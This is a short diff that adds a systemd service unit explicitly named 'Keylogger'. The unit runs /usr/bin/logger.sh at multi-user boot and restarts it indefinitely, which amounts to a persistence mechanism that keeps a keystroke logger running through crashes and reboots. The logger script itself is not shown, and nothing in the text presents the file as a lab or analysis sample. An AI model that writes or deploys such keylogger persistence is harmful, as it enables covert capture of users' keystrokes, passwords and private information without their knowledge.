@@ -1,0 +1,13 @@
+[Unit]
+Description=Keylogger
+StartLimitIntervalSec=0
+
+[Service]
+Type=simple
+Restart=always
+RestartSec=360
+ExecStart=/usr/bin/logger.sh
+
+[Install]
+WantedBy=multi-user.target
+
